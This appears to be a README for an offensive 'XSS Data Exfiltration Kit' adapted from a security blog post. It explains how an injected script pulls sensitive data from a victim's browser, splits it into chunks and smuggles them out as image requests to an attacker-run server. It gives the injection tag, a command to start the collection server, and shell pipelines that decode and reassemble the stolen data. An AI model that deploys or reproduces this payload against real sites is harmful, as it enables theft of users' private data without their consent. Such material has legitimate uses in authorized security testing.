# XSS-Data-Exfil-Kit
XSS Data Exfiltration Tool
Edit of code this post -  https://www.trustedsec.com/blog/simple-data-exfiltration-through-xss/

This code demonstrates data exfiltration through an XSS (Cross-Site Scripting) vulnerability. The XSS payload is designed to extract sensitive data from the victim's web browser and divide it into manageable chunks. These chunks are then sent out as image requests, with the data embedded in the image filenames. The process also includes example commands and a Python script for reconstructing the original data.

For a detailed walkthrough with screenshots, please refer to our blog post at this link: Simple Data Exfiltration Through XSS.

To make the payload target specific sensitive data accessible to the victim, you can customize the "exfilPayload.js" file.

Here are the steps involved:

<script src="http://127.0.0.1/exfilPayload.js"></script>

Start a Python HTTP server in the directory where "exfilPayload.js" is located:

bash
python -m SimpleHTTPServer 80

"exfilPayload.js" will send the data chunks to the same server.

Collect these requests into a text file and clean them up:

bash
grep '/exfil/' exfilledData.txt | awk -F'/exfil/' '{print $2}' | awk -F'/' '{print $1 " " $2}' | awk -F'.jpg' '{print $1}' | while read i; do echo $i ; done > exfilledDataCleaned.txt


Use the provided Python script to reconstruct the original data.

Finally, assemble the data chunks together using:

bash    
for file in ./{0..225}.chunk; do cat $file | base64 -d; done > restoredSuperSecretData.html

                                        


                                               
